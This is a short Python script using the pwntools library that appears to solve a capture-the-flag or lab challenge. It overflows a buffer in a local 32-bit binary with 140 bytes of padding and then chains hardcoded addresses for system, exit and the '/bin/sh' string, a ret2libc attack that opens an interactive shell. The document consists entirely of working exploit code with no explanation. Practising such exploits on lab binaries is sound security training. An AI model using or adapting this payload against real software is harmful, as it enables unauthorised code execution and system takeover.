from pwn import *

system_addr = 0xf7e0ff00
exit_addr = 0xf7e02850
binsh_addr = 0xf7f5732b

pay=b'a'*140+p32(system_addr)+p32(exit_addr)+p32(binsh_addr)
p=process("./x86")
p.sendline(pay)
p.interactive()